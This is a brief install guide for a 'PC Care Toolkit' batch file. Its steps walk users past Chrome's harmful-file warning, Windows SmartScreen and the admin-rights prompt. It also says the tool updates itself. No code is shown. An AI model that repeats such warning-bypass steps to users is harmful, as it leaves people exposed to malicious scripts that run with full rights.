How to use (video, 2 min)

Install once (2 minutes)

  1. Click Download PC Care Toolkit.
  2. If Chrome says the file may be harmful: click Keep.
  3. Open the downloaded file PC-Care-Toolkit.bat.
  4. If you see "Windows protected your PC": click More info, then Run anyway.
  5. When Windows asks "Do you want to allow this app to make changes?": click Yes.
  6. Type Y and press Enter to set up the PC. Wait until it says it is finished.
  7. Restart the PC once.

After that

You never need to download it again. It updates itself.

When you have a problem, double-click PC Care on your desktop, type the number of your problem and press Enter.
